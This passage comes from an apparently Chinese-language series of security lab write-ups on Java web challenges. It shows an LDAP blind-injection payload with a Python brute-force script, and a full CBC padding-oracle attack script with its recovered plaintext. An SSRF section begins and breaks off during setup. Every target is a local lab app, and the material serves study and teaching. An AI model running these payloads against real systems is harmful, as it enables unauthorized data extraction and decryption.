  * LDAP+Docker [Docker快速搭建LDAP](https://www.cnblogs.com/eoalfj/p/11837415.html)
    docker pull osixia/openldap:1.3.0
    ldapadd -x -H ldap://localhost:389 -D "cn=admin,dc=example,dc=org" -w admin -f test.ldif 
    //test.ldif
    dn: cn=ananaskr1,dc=example,dc=org
    objectClass: simpleSecurityObject
    objectClass: inetOrgPerson
    cn: ananaskr1
    sn: ad
    uid: admin
    userPassword:: e1NTSEF9bzVZaGNCQUg4Sm9IcC9LNEZXV2YyK21vQ1VJemkwcmw=
    mail: PI:EMAIL
    description: hacked by ananaskr
  * IDEA+maven-archetype-webapp
#### 2\. 配置web.xml
      Archetype Created Web Application
        day20
        com.ananaskr.day20.UserController
        day20
        /day20
#### 3\. payload构造
由于在新加入的条目中含有description字段，且description也未在黑名单中。就使用LDAP盲注来获取description的值。构造的payload如下
    ?username=admin)(description=H*
    ?username=admin)(description=Ha*
可编写脚本来获取
    import requests
    import string
    url = "http://localhost:8080/Day20_war_exploded/day20?username=admin)(description="
    Alpha=string.ascii_letters+string.digits+' '
    des = ""
    while True:
        flag = False
        for i in Alpha:
            url1 = url + des +i+"*"
            res=requests.get(url=url1)
            if("User is found." in res.text):
                des = des + i
                flag=True
                break
        if(flag==False):
            break
    print(des)
#### 4\. 结果
# Day21 Padding Oracle攻击
### 代码
Day 21  
### 漏洞点
在代码中，方法decrypt使用AES算法解密用户提供的十六进制编码的密文。加密密文是攻击者已知的，且初始的IV攻击者也已知。然而，攻击者并不知道密钥，因此被加密的明文无法获知。但密文并没有被MAC或者签名保护，攻击者可以操作IV(密文的前16个比特)，利用CBC的延展性来导致BadPaddingException。因此，在不知道密钥的情况下，可以通过Padding
Oracle攻击来获取明文。
关于Padding Oracle的资料。  
.  
### 复现过程
#### 1\. 环境
  * IDEA+springmvc
#### 2\. 修正代码
将`req.getParameter("c")`改为`req.getParameter("c").toCharArray()`
#### 2\. 配置web.xml
web.xml
            encodingFilter
            org.springframework.web.filter.CharacterEncodingFilter
                encoding
                UTF-8
                forceEncoding
                true
            encodingFilter
            /*
            contextConfigLocation
            /WEB-INF/applicationContext.xml
            org.springframework.web.context.ContextLoaderListener
            dispatcher
            org.springframework.web.servlet.DispatcherServlet
            1
            dispatcher
            /
#### 3\. 配置dispatcher-servlet.xml
dispatcher-servlet.xml
                /WEB-INF/
                .jsp
#### 4\. 配置applicationContext.xml
applicationContext.xml
#### 5\. payload构造
攻击者已知的是初始IV和密文。
    // Payload to decrypt: 699c99a4f27a4e4c310d75586abe8d32a8fc21a1f9e400f22b1fec7b415de5a4
    IV: 699c99a4f27a4e4c310d75586abe8d32
    密文: a8fc21a1f9e400f22b1fec7b415de5a4
根据Padding Oracle攻击的步骤，利用IV=00000000000000000000000000000000来开始猜测Intermediary
Value的最后一字节，通过测试，当最后一字节值为0x3b，即发送请求为`http://localhost:8080/Day21_war_exploded/decrypt?c=0000000000000000000000000000003ba8fc21a1f9e400f22b1fec7b415de5a4`时，返回的响应不是"Invalid
Padding"。此时最后一字节的Intermediary Value =`0x3b^0x01`=0x3a。  
然后将Intermediary Value^0x02来继续猜测倒数第二字节的Intermediary Value值。  
迭代地进行计算，一共16个字节，最多需要16*256次尝试即可得到Intermediary
Value值，然后将其与初始IV进行异或，即可得到明文。为了方便，编写如下脚本，计算Intermediary Value值
IV.py
    import requests
    url1 = "http://localhost:8080/Day21_war_exploded/decrypt?c="
    cipher = "a8fc21a1f9e400f22b1fec7b415de5a4"
    intervalue = []
    value = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]
    for j in range(1,17):
        IV = ""
        IV = IV+"00"*(16-j)
        inva = ""
        for k in range(len(intervalue)):
            inva_t=hex(intervalue[k]^value[len(intervalue)])[2:]
            if(len(inva_t)==1):
                inva="0"+inva_t+inva
            else:
                inva=inva_t+inva
        for i in range(1,257):
            if(len(hex(i)[2:])==1):
                IV1 = IV+"0"+hex(i)[2:]
            else:
                IV1 = IV+hex(i)[2:]
            c = IV1+inva+cipher
            url = url1+c
            res=requests.get(url=url)
            if("Invalid" not in res.text):
                intervalue.append(i^value[len(intervalue)])
                print(intervalue)
                break
#### 6\. 结果
得到的结果`Intermediary Value =[58, 133, 182, 98, 80, 125, 5, 57, 41, 32, 21, 150,
200, 245, 249, 30]`，第一个表示最后一字节,将其与初始IV进行异或，得到明文为"welldone"，如下所示  
# Day22 SSRF
### 代码
Day 22  
### 漏洞点
参数url在第31行通过getUrl()转换为URLConnection对象。在getURl方法中会检查url是否以http开头，是否是有效的外部URL，并设置禁止跳转跟随。然而，在第33-43行中允许设置Location头进行重定向。若受攻击者控制的URL发送受攻击者控制的Location头，则可进行SSRF。但由于会对Location头的值是否以
### 复现过程
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 配置web.xml